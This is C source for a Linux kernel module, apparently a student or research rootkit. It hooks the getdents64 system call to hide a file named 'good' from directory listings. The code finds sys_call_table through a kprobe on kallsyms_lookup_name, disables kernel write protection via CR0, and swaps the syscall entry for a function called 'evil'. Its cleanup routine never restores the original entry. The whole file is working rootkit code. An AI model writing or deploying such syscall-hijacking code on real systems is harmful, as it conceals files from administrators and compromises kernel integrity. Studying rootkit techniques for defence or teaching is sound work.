#include <linux/init.h>   // included for __init and __exit macros
#include <linux/kernel.h> // included for KERN_INFO
#include <linux/module.h> // included for all kernel modules
#include <linux/kprobes.h> 
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/string.h>

MODULE_LICENSE("GPL"); // The license  under which the module is distributed.
MODULE_AUTHOR("Riccardo Lamarca & Leonardo Gori"); // The original authors of the module
MODULE_DESCRIPTION(
    "getdents-system-call-hijack's Linux Kernel Module."); // The Description of the module.



// define the type of the pointer to the kallsyms_lookup_name() function
typedef void ** (*kallsyms_lookup_name_pointer)(char*);

// define the pointer to the getdents64 syscall as a global variable
// this allows this pointer to be settled in the evil_init function,
// and can be called later by the kernel when the syscall is made
asmlinkage long (*__x64_sys_getdents64_ptr) (unsigned int fd,
				    struct linux_dirent64 __user * dirent,
				    unsigned int count);

// name of the file to hide
char to_hide[] = "good";

// kallsyms_lookup_name is the function that allows to get the address of any symbol in the kernel's symbol table
// keyprobes allow to get the address of the symbols that are in the kernel's text section
// we cannot get the address of the syscall table directly, since it is stored in the kernel's data section
// for this reason, we use keyprobe to get kallsyms_lookup_name() to get the syscall table
static char symbol[KSYM_NAME_LEN] = "kallsyms_lookup_name";
static struct kprobe kp = {
	.symbol_name	= symbol,
};


// The malicious function that hides the content of the folder
asmlinkage ssize_t evil(unsigned int fd, struct linux_dirent64 __user * dirent, size_t count) {


  unsigned long local_fd;
  struct linux_dirent64 __user * local_dirent;
  size_t local_count;

  // push the arguments of the system call to the stack, in order to retrieve them after the original getdents syscall is executed
  asm volatile("movq %rdi, %rbx;");
  asm volatile(
    "movq 0x60(%rdi), %r8;"
    "pushq %r8;"
    );

  asm volatile(
    "movq 0x68(%rdi), %r8;"
    "pushq %r8;"
    );

  asm volatile(
    "movq 0x70(%rdi), %r8;"
    "pushq %r8;"
    );
  asm volatile("movq %rbx, %rdi;");


  // call the real system call, and store the amount of bytes read in ret
  ssize_t ret = __x64_sys_getdents64_ptr(fd, dirent, count);


  // ########### Start the actual hijack #############


  // retrieve the original syscall's parameters
  asm volatile(
    "popq %0;"
    : "=r" (local_fd)
  );
  asm volatile(
    "popq %0;"
    : "=r" (local_dirent)
  );
  asm volatile(
    "popq %0;"
    : "=r" (local_count)
  );


  // pr_info("Hijack completed !? >:(\n");
  char * temp_dirent_pointer;

  // amount of bytes read in each iteration
  ssize_t current_size_read = 0;

  char * temp_char_pointer;

  // while the amount of bytes that are looked up is less than the actual amount of bytes that has been read by the original system call
  while(current_size_read < ret) {

    // jump to an offset of 19 bytes starting from the address of the linux_dirent struct, thus landing on the address of the d_name[] attribute
    // which contains the name of the file
    temp_char_pointer = (char*)local_dirent;
    temp_char_pointer += 19;

    // if the name of the file is equal to the string we want to hide
    if(strcmp(temp_char_pointer, to_hide) == 0) {
      // replace the first byte of the buffer with 0, thus terminating each attempt to print it
      *temp_char_pointer = '\0';
      // break the loop
      break;
    }

    // increment the current amount of bytes read until this moment by the size of the current linux_dirent data structure
    current_size_read += local_dirent->d_reclen;

    // update the pointer of the local_dirent to the next one
    temp_dirent_pointer = (char*)local_dirent;
    temp_dirent_pointer += local_dirent->d_reclen;
    local_dirent = (struct linux_dirent64* )temp_dirent_pointer;
  }

  return ret;
};

static void ** leak_sys_call_table(void) {
  // register the keyprobe
  int ret = register_kprobe(&kp);
  pr_info("kallsyms_lookup_name = %llx\n", kp.addr);

  // store the address of the kallsyms_lookup_name, which returns the address of the given symbol inside the kernel's symbol table
  kallsyms_lookup_name_pointer to_call = (kallsyms_lookup_name_pointer)kp.addr;
  
  // call the kallsyms_lookup_name with "sys_call_table" as argument, store the address of the syscall table inside addr
  void ** addr = to_call("sys_call_table");
  return addr;
};

// This function defines what happens when this module is inserted into the
// kernel. ie. when you run insmod command.
static int __init evil_init(void) {
  // leak the address of the syscall table
  void ** sys_call_table = leak_sys_call_table();
  
  // store the address of the getdents64 syscall entry by adding its number as an offset to the address of  the syscall table
  __x64_sys_getdents64_ptr = *(sys_call_table + 217);

  // unset the control register 0 in order to overwrite the syscall table
  asm volatile("mov %0,%%cr0": : "r" (read_cr0() & (~0x10000)));
  // overwrite the entry of the getdents syscall with the address of our malicious function
  *(sys_call_table + 217) = &evil;
  // reset the control register 0 which makes the syscall table read only
  asm volatile("mov %0,%%cr0": : "r" (read_cr0() | 0x10000));

  printk(KERN_INFO "Evil module injected!\n");
  return 0; // Non-zero return means that the module couldn't be loaded.
}



// This function defines what happens when this module is removed from the
// kernel. ie.when you run rmmod command.
static void __exit evil_cleanup(void) {
  printk(KERN_INFO "Cleaning up module.\n");
}

module_init(evil_init);    // Registers the __init function for the module.
module_exit(evil_cleanup); // Registers the __exit function for the module.
